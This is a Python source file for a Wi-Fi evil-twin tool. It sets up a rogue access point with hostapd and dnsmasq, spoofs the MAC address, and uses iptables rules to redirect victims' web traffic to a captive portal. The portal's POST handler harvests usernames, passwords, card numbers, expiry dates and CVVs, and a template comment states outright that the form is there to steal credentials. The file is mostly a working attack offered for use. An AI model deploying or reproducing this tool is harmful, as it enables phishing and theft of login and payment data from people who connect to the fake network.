# EvilTwin Cappy
# by FLOCK4H
# v1.0.0

import os, shutil, time, sys, subprocess, json
from .colors import wprint, ColorCodes, iprint, cprint, cinput
from http.server import SimpleHTTPRequestHandler, HTTPServer
import threading
import random

cc = ColorCodes()

script_dir = "/usr/local/share/Cappy"

def random_mac_address():
    mac = [0x00, 0x16, 0x3e,
           random.randint(0x00, 0x7f),
           random.randint(0x00, 0xff),
           random.randint(0x00, 0xff)]
    return ':'.join(map(lambda x: f"{x:02x}", mac))

def change_mac_address(interface):
    new_mac = random_mac_address()
    try:
        subprocess.run(['sudo', 'ifconfig', interface, 'down'], check=True)
        subprocess.run(['sudo', 'ifconfig', interface, 'hw', 'ether', new_mac], check=True)
        subprocess.run(['sudo', 'ifconfig', interface, 'up'], check=True)
        cprint(f"MAC address for {interface} changed to {new_mac}")
        time.sleep(1.2)
    except subprocess.CalledProcessError as e:
        print(f"Failed to change MAC address: {e}")

def check_dependencies(dependencies):
    for dep in dependencies:
        result = subprocess.run(["which", dep], capture_output=True, text=True)
        if result.returncode != 0:
            wprint(f"{dep} is not installed. Please install {dep} and try again.")
            install = cinput(f"Install {dep} now? (Y/n)")
            if install.lower() == "y":
                os.system(f"sudo apt-get install {dep}")
                cprint(f"{dep} successfully installed!")
                time.sleep(1.5)
        else:
            iprint(f"{dep} is installed.")
        time.sleep(0.2)

def mod_path(path, mod="copy"):
    if mod == "ren" and os.path.exists(f"{path}.copy"):
        os.remove(path)
        shutil.move(f"{path}.copy", path)

    shutil.copy(path, f"{path}.copy")    

def safecall(cmd):
    result = os.system(cmd)
    if result != 0:
        print(f"{cc.YELLOW}Catched command failure, but {cc.GREEN}continuing{cc.YELLOW}: {cmd}{cc.RESET}")
    return result

def delete_iptables_rule(table, rule):
    check_command = f"sudo iptables -t {table} -C {rule}"
    delete_command = f"sudo iptables -t {table} -D {rule}"
    if safecall(check_command) == 0:
        safecall(delete_command)

def ip_config(wlans):
    for wlan in wlans:
        iprint("Configuring IP adresses...")
        safecall(f"sudo ifconfig {wlan} 192.168.1.1 netmask 255.255.255.0 up")
        safecall(f"sudo sh -c \"echo 1 > /proc/sys/net/ipv4/ip_forward\"")
        safecall(f"sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")
        safecall(f"sudo iptables -t nat -A PREROUTING -i {wlan} -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1")
        safecall(f"sudo iptables -A FORWARD -i {wlan} -p tcp --dport 80 -d 192.168.1.1 -j ACCEPT")

def handle_services():
    safecall("sudo systemctl unmask hostapd")
    cprint("Hostapd was unmasked...")

    safecall(f"sudo systemctl stop dnsmasq")
    cprint("Stopped dnsmasq")

    safecall(f"sudo systemctl stop hostapd")
    cprint("Stopped hostapd")

    safecall(f"sudo systemctl daemon-reload")
    iprint("Starting dnsmasq...")
    safecall(f"sudo systemctl start dnsmasq")
    time.sleep(2)

def handle_networking(wlans):
    for wlan in wlans:
        safecall(f"sudo ifconfig {wlan} up")
        iprint("Restarting networking service...")
        safecall(f"sudo systemctl restart networking")

class Adapter:
    def __init__(self, inf=["wlan0"]):
        self.interfaces = inf
        self.interface = inf[0]
        self.init_adapter()

    def init_adapter(self, mode="managed"):
        try:
            for interface in self.interfaces:
                os.system(f'sudo iwconfig {interface} mode {mode}')
        except Exception as e:
            wprint(f"Error while putting interface in monitor mode: {e}")

class Config:
    def __init__(self, inf=None):
        self.run_config(inf=inf)

    def run_config(self, inf=None):
        cprint("Disconnecting from current network...")
        safecall(f"sudo nmcli device disconnect {inf[0] if inf else 'wlan0'}")

        if inf is None:
            inf = ["wlan0"]

        self.adapter = Adapter(inf=inf)
        self.wlan = self.adapter.interface

        mod_path(path="/etc/hostapd/hostapd.conf")
        mod_path(path="/etc/default/hostapd")
        mod_path(path="/etc/dnsmasq.conf")
        mod_path(path="/etc/network/interfaces")
        self.write_config(interface=self.wlan, ssid="Cappy!", channel=10)

        self.write_to_config("/etc/default/hostapd", f"DAEMON_CONF=/etc/hostapd/hostapd.conf")
        self.write_to_config("/etc/dnsmasq.conf", f"""interface={self.wlan}\ndhcp-range=192.168.1.50,192.168.1.150,12h""")
        self.write_to_config("/etc/network/interfaces", f"#")
    
    def write_config(self, **kwargs):
        interface = kwargs.pop("interface", "wlan0")
        driver = kwargs.pop("driver", "nl80211")
        ssid = kwargs.pop("ssid", "EvilTwin")
        hw_mode = kwargs.pop("hw_mode", "g")
        channel = str(kwargs.pop("channel", 10))
        macaddr_acl= kwargs.pop("macaddr_acl", "0")
        auth_algs = kwargs.pop("auth_algs", "1")
        ignore_broadcast_ssid = kwargs.pop("ignore_broadcast", "0")

        try:
            with open("/etc/hostapd/hostapd.conf", "w") as f:
                f.write(
    f"""interface={interface}
driver={driver}
ssid={ssid}
hw_mode={hw_mode}
channel={channel}
macaddr_acl={macaddr_acl}
auth_algs={auth_algs}
ignore_broadcast_ssid={ignore_broadcast_ssid}
logger_syslog=-1
logger_syslog_level=0
logger_stdout=-1
logger_stdout_level=0
""".lstrip()
                )
        except Exception as e:
            wprint(f'Error, couldn\'t save to the /etc/hostapd/hostapd.conf, {e}')
    
    def write_to_config(self, path, text):
        try:
            with open(path, "w") as f:
                f.write(text)
        except Exception as e:
            wprint(f'Error, couldn\'t save to the {path})')

def shutdown_network(conf=None):
    print("")
    iprint("Stopping dnsmasq...")
    safecall(f"sudo systemctl stop dnsmasq")
    iprint("Stopping hostapd...")
    safecall(f"sudo systemctl stop hostapd")

    safecall(f"sudo systemctl daemon-reload")
    iprint("Changing back the IP settings...")
    safecall(f"sudo sh -c \"echo 0 > /proc/sys/net/ipv4/ip_forward\"")
    delete_iptables_rule(f"nat", f"POSTROUTING -o eth0 -j MASQUERADE")
    delete_iptables_rule(f"nat", f"PREROUTING -i {conf.wlan} -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1")
    delete_iptables_rule(f"filter", f"FORWARD -i {conf.wlan} -p tcp --dport 80 -d 192.168.1.1 -j ACCEPT")

    mod_path(path="/etc/hostapd/hostapd.conf", mod="ren")
    mod_path(path="/etc/default/hostapd", mod="ren")
    mod_path(path="/etc/dnsmasq.conf", mod="ren")
    mod_path(path="/etc/network/interfaces", mod="ren")
    iprint("Original configs restored, restarting Network Manager..")
    safecall(f"sudo systemctl restart NetworkManager")

class CaptivePortalHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        try:
            if self.path == '/hotspot-detect.html':
                self.path = '/index.html'
            elif self.path == '/action.html':
                self.path = '/action.html'
            elif not os.path.exists(self.path[1:]):
                self.path = '/index.html'
            return SimpleHTTPRequestHandler.do_GET(self)
        except Exception as e:
            self.send_error(500, f"Internal server error: {str(e)}")

    def do_POST(self):
        try:
            if self.path == '/action.html':
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                fields = dict(x.split('=') for x in post_data.decode().split('&'))
                username = fields.get('username', '')
                password = fields.get('password', '')
                credit_card = fields.get('credit', '')
                expiry_date = fields.get('expire', '')
                cvv = fields.get('cvv', '')
                if credit_card == '':
                    print(f"{cc.BRIGHT}{cc.GREEN}Captured credentials - {cc.BLUE}Username: {cc.WHITE}{username}, {cc.RED}Password: {cc.WHITE}{password}{cc.RESET}")
                else:
                    print(f"{cc.BRIGHT}{cc.GREEN}Captured credentials - {cc.CYAN}Card number: {credit_card}, Expire date: {expiry_date}, CVV: {cvv}")
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                with open('action.html', 'rb') as file:
                    self.wfile.write(file.read())
            elif self.path == '/data':
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                data = json.loads(post_data.decode())
                print(f"{cc.BRIGHT}{cc.GREEN}Collected Data: {cc.WHITE}{data}{cc.RESET}")
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({'status': 'success'}).encode())
            else:
                self.send_response(404)
                self.end_headers()
        except Exception as e:
            self.send_error(500, f"Internal server error: {str(e)}")

    def handle_one_request(self):
        try:
            super().handle_one_request()
        except Exception as e:
            self.send_error(400, f"Bad request: {str(e)}")


class WebServer:
    def __init__(self):
        server_thread = threading.Thread(target=self.start_captive_portal)
        server_thread.daemon = True
        server_thread.start()

    def get_template_name(self, template_dir):
        if os.path.exists(template_dir):
            templates = os.listdir(template_dir)
            cprint("Listing templates...")
            for i, item in enumerate(templates):
                cprint(f"{i}) {item}")
            temp_num = int(cinput("Enter template number"))
            if 0 <= temp_num < len(templates):
                return templates[temp_num]
        return None

    def start_captive_portal(self):
        templates_dir = f"{script_dir}/templates"
        if not os.path.exists(templates_dir):
            os.makedirs(templates_dir, exist_ok=True)
        choice_template = self.get_template_name(templates_dir)
        if choice_template:
            os.chdir(os.path.join(templates_dir, choice_template))
            handler = CaptivePortalHandler
            httpd = HTTPServer(("192.168.1.1", 80), handler)
            iprint("Serving captive portal on {}http://192.168.1.1:80 {}".format(cc.GREEN, cc.RESET))
            print(cc.LIGHT_BLUE, cc.BRIGHT, "Evil Twin has started!", cc.BLUE)
            httpd.serve_forever()
        else:
            print("No valid template selected. Exiting.")

class Cappy:
    def __init__(self):
        cprint("Checking dependencies..")
        check_dependencies(["dnsmasq", "lighttpd", "hostapd"])
        self.run_cappy()

    def run_cappy(self):
        try:
            interfaces = get_interface()
            show_interfaces(interfaces)
            self.interface = self.set_wlan_interface(interfaces)
            for interface in self.interface:
                change_mac_address(interface)
            self.buy_orange_cappy()
            action = self.read_cappy_composition()
            self.template_path = "/usr/local/share/Cappy/templates"
            self.drink_healthy_juice(action)
        except KeyboardInterrupt:
            wprint("\nExiting..\n")
            sys.exit(0)

    def take_off_the_plastic_cap(self):
        self.buy_orange_cappy()
        action = self.read_cappy_composition()
        self.drink_healthy_juice(action)

    def break_the_label(self, **kwargs):
        # Writing _config
        def_app = kwargs.pop('default_app', "mousepad")
        write = kwargs.pop('write', False)
        read = kwargs.pop('read', False)
        _config = f"{script_dir}/_config"

        if write:
            try:
                with open(_config, "w") as f:
                    f.write(f"DEFAULT_APP={def_app}\n")
                    cprint("_config created in {}".format(_config))
            except Exception as e:
                wprint("Failed to break the label of the cappy juice! {}".format(e))
        elif read:
            try:
                with open(_config, "r") as f:
                    data = f.read()
                    return str(data)
            except Exception as e:
                wprint("Failed to break the label of the cappy juice! {}".format(e))

    def buy_orange_cappy(self):
        os.system('clear')
        print(f"""
{cc.ORANGE}  _
{cc.GREEN} |c|   {cc.ORANGE}┏┓        
{cc.ORANGE}.'a`.  {cc.ORANGE}┃ ┏┓┏┓┏┓┓┏
{cc.GREEN}| p |  {cc.ORANGE}┗┛┗┻┣┛┣┛┗┫
{cc.ORANGE}| p |  {cc.ORANGE}    ┛ ┛  ┛        
{cc.ORANGE}|_y_|         {cc.BRIGHT}{cc.GREEN}healthy diet, {cc.RED}happy{cc.GREEN} stomach.{cc.RESET}
                {cc.BRIGHT}{cc.MAGENTA}by FLOCK4H{cc.RESET}
""")
        time.sleep(1)

    def read_cappy_composition(self):
        actions = {1: "Start", 2: "Create Template", 3: "Edit Template", 4: "Remove Template", 5: "List Templates"}
        for index, action in actions.items():
            cprint(f"{index}) {action}")
        decision = cinput(f"{cc.BRIGHT}[CAPPY]", color=cc.CYAN)
        return decision
    
    def throw_away_plastic_bottle(self):
        pass

    def drink_healthy_juice(self, action):
        if action == "1":
            return
        elif action == "2":
            name = cinput("Name the template")
            self.create_new_template(name)
            iprint("Template created! Path: /usr/local/share/3way/templates/{} \ Name: {}".format(name, name))
            time.sleep(2)
        elif action == "3":
            self.mod_template("edit")
        elif action == "4":
            self.mod_template("remove")
        elif action == "5":
            self.mod_template("list")
        
        self.take_off_the_plastic_cap()

    def mod_template(self, mod):
        if mod == "edit":
            if not os.path.exists(f"{script_dir}/_config"):
                self.break_the_label(write=True)
            self.default_app = self.break_the_label(read=True).replace("DEFAULT_APP=", "")
            name = cinput("Enter name of the template to edit")
            template_path = f"{self.template_path}/{name}"
            try:
                if os.path.exists(template_path):
                    cprint(f"Found the template! Using {self.default_app} to edit, press Ctrl+C to change the default program.")
                    time.sleep(2)
                    cmd = f"{self.default_app} {template_path}/index.html".replace("\n", "").strip(" ")
                    cprint(cmd)
                    time.sleep(2)
                    os.system(cmd)
                else:
                    wprint("Couldn't find the template of name {}".format(name))
            except KeyboardInterrupt:
                name = cinput("Enter name of a program to set as default (e.g., nano, code, geany, thonny)")
                self.break_the_label(write=True, def_app=name)
                iprint("Changes applied, restart the app.")
                sys.exit(0)
        elif mod == "list":
            for item in os.listdir(self.template_path):
                cprint(item)
            time.sleep(3)
        elif mod == "remove":
            name = cinput("Name of the template to remove")
            for item in os.listdir(self.template_path):
                if item == name.strip():
                    shutil.rmtree(os.path.join(self.template_path, item))
                    iprint("Successfully removed {} template.".format(name))
                    time.sleep(2)
                    return
            wprint("Coulnd't find a template with this name")
            time.sleep(1.5)
            
    def create_new_template(self, name):
        try:
            if not os.path.exists(f"{self.template_path}/{name}"):
                os.makedirs(f"{self.template_path}/{name}")
            with open(f"{self.template_path}/{name}/index.html", "w") as f:
                f.write("<html><h1>Here put the HTML content of the site, this file is the first site that user will see after associating.</h1></html>")
            with open(f"{self.template_path}/{name}/action.html", "w") as f:
                f.write("""<html><h1>
    <!-- Here goes the code after submitting the form, 
    in order to steal credentials, we must add 'form' tag with 
    'username', 'password', 'submit' tags to the index.html file -->
    Hello! 
</h1></html>""")
        
        except Exception as e:
            wprint("Exception in 'create_new_template'", e)

    def set_wlan_interface(self, infs):
        try:
            choice = cinput('Choose interface/s')
            selected_indexes = [int(index.strip()) - 1 for index in choice.split(",")]
            wlan = [infs[index][0] for index in selected_indexes if index < len(infs)]
            wlan = wlan if wlan else ["Invalid choice"]
            cprint(f'Chosen interface(s): {", ".join(wlan)}, flying away..')
            time.sleep(1)
            return wlan
        except Exception as e:
            cprint(f'Something went wrong! Please try again: {e}', cc.ORANGE)
            time.sleep(2)
            self.set_wlan_interface()

def get_driver_name(iface):
    try:
        driver_info = subprocess.check_output(f'ethtool -i {iface} 2>/dev/null', shell=True, encoding='utf-8').strip()
        for line in driver_info.split('\n'):
            if line.startswith('driver:'):
                return line.split(':')[1].strip()
    except subprocess.CalledProcessError:
        return "Unknown"

def get_interface():
    os.system("clear")
    print(f"""{cc.BRIGHT}
\t\t\t┏┓        
\t\t\t┃ ┏┓┏┓┏┓┓┏
\t\t\t┗┛┗┻┣┛┣┛┗┫
\t\t\t    ┛ ┛  ┛
    \t\t{cc.BLUE}{cc.BLINK}   SETUP YOUR WLAN CARD{cc.RESET}          

    """)
    iprint("Listing network interfaces...\n")
    try:
        output = subprocess.check_output('iwconfig', stderr=subprocess.STDOUT, shell=True, encoding='utf-8').strip()
    except subprocess.CalledProcessError as e:
        print("Error executing iwconfig:", e)
        return []

    iface_details = []
    iface_name = ''
    mode = ''
    for line in output.split('\n'):
        if line and not line.startswith('  '):
            if iface_name: 
                driver_name = get_driver_name(iface_name)
                iface_details.append((iface_name, driver_name, mode))
            iface_name = line.split()[0]
            mode = '' 
        elif 'Mode:' in line:
            mode = line.split('Mode:')[1].split()[0]

    if iface_name:
        driver_name = get_driver_name(iface_name)
        iface_details.append((iface_name, driver_name, mode))

    return iface_details

def show_interfaces(interfaces):
    max_len_iface = max(len(iface[0]) for iface in interfaces) if interfaces else 0
    max_len_driver = max(len(iface[1]) for iface in interfaces) if interfaces else 0

    print(f"""{cc.GREEN}{cc.BRIGHT}ID        Name         Driver            Mode{cc.RESET}""")
    print(f"{cc.GREEN}──────────────────────────────────────────────────────{cc.RESET}")
    for index, (iface, driver, mode) in enumerate(interfaces, start=1):
        formatted_iface = f"{cc.BRIGHT}{cc.BLUE}{index})        {iface.ljust(max_len_iface)}        {driver.ljust(max_len_driver)}        {mode}"
        print(formatted_iface)
    print(f"{cc.GREEN}──────────────────────────────────────────────────────{cc.RESET}")
